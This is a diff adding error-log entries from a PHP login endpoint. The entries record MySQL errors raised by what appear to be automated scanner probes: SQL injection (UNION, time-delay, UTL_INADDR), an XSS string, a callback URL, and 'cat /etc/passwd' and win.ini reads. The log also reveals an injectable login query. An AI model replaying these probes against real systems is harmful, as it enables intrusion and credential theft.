@@ -188,3 +188,1324 @@ Data too long for column 'avatar' at row 1
 #3 D:\Programs\OSPanel\home\traffic-control.local\src\server\router.php(35): UserController::avatar_update()
 #4 D:\Programs\OSPanel\home\traffic-control.local\src\server\router.php(42): Router::resolve()
 #5 {main}
+POST /user/update/avatar
+Data too long for column 'avatar' at row 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(150): mysqli->query('UPDATE user SET...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(201): Database::update('user', Array, Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(339): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::avatar_update()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'https://1069442152589116651.owasp.org'' AND password = '3f6fb401e4d3e5c2c9043775' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'http://1069442152589116651.owasp.org'' AND password = '3f6fb401e4d3e5c2c90437753' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"<scrIpt>alert(1);</scRipt>' AND password = '3f6fb401e4d3e5c2c9043775361303e25eb' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+The used SELECT statements have a different number of columns
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL select NULL -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25eb' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- ' AND password = '3f6fb401e4d3' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS wh' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- ' AND password = '3f6fb401e4d3' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- ' AND password = '3f6fb401e4d3' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(15000) / '' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME') -- ' AND password = '3f6fb401e4d' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMN' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dua' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dua' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+FUNCTION utl_inaddr.get_host_name does not exist
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dua' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dua' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'case when cast(pg_sleep(15.0) as varchar) > '' then 0 else 1 end -- ' AND passwo' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WAITFOR DELAY '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WAITFOR DELAY '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WAITFOR DELAY '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:15' -- ' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:15' (' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+Unknown column 'cat' in 'where clause'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'cat /etc/passwd;'' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '15.0&'' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sleep 15.0;'' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\win.ini&'' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\win.ini' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '15.0&'' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '15.0' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
